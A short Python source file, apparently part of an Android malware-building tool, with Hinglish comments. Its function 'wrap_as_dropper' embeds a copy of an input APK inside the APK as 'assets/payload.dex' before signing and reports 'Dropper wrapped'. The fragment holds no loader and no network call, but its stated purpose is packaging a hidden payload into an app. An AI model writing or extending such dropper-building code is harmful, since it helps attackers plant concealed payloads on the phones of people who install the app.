import os
import shutil
import zipfile


def wrap_as_dropper(input_apk: str, output_apk: str, session_dir: str):
    """
    Payload (input APK copy) ko assets/payload.dex ke naam se embed karo.
    Self-reference bug fix: pehle temp copy banao, phir embed.
    Signing ke PEHLE run hota hai — META-INF touch mat karo.
    """
    payload_tmp = os.path.join(session_dir, "payload_copy.bin")
    shutil.copy2(input_apk, payload_tmp)

    try:
        with zipfile.ZipFile(input_apk, "a") as zf:
            if "assets/payload.dex" not in zf.namelist():
                info = zipfile.ZipInfo("assets/payload.dex")
                info.compress_type = zipfile.ZIP_STORED
                with open(payload_tmp, "rb") as pf:
                    zf.writestr(info, pf.read())
    finally:
        if os.path.exists(payload_tmp):
            os.remove(payload_tmp)

    shutil.copy2(input_apk, output_apk)
    print(f"[✓] Dropper wrapped → {output_apk}")
